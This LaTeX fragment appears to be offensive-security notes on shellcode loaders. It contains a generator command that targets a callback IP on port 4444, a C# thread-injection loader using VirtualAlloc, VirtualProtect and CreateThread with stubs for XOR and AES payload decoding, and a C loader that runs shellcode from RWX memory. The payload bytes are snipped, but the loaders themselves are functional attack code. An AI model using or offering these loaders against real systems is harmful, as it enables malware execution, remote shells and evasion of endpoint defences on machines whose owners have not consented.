
\section{ShellCode loader}

\begin{verbatim}
python micr0\ shell.py --ip 10.10.16.2 -p 4444 --language csharp
\end{verbatim}

\subsection{Thread injection}

\begin{verbatim}
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr param,
            uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle,
            uint dwMilliseconds);

        public static void DisplayBuf(byte[] buf)
        {
            String hex = String.Empty;
            buf.ToList().ForEach(b => hex += b.ToString("x2"));
            Console.WriteLine(hex);
        }

        private static void Main(string[] args)
        {
            // xor buffer and decode
            //byte[] buf = {< SNIP > };
            //buf = xor(buf, 0x5c);

            // aes base64ed string and decode
            // byte[] buf;
            //string bufEnc = "<SNIP>";
            //buf = Uncrypt(bufEnc);

            DisplayBuf(buf);

            // Allocate RW space for shellcode
            var lpStartAddress =
                VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x04);
            
            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            uint lpflOldProtect;
            VirtualProtect(lpStartAddress, (uint)buf.Length, 0x20,
                out lpflOldProtect);

            // Execute the shellcode in a new thread
            uint lpThreadId = 0;
            var hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0,
                ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
\end{verbatim}


Note in \verb+c+:
\begin{verbatim}
#include "windows.h"
#include "stdlib.h"

unsigned char shellcode[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0......};  // SHELLCODE HERE

int main()
{
    int length = sizeof(shellcode);
    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, shellcode, length);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
}
\end{verbatim}


